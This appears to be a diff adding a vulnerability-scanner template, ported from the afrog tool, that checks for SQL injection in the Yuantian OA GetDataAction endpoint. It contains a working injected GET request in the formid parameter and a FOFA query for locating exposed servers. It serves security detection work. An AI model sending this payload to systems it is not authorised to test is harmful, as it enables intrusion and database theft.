@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - '''0xc4ca4238a0b923820dcc509a6f75849b'''
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a'
+id: yuantian-oa-getdata-action-sqli
+info:
+  author: zan8in
+  description: |
+    源天OA GetDataAction 接口存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库中的数据，造成信息泄漏
+    fofa: body="/vmain/login.jsp"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 源天OA GetDataAction SQL注入漏洞
+  severity: high
+  tags: yuantian,oa,getdata,action,sqli,argus-import
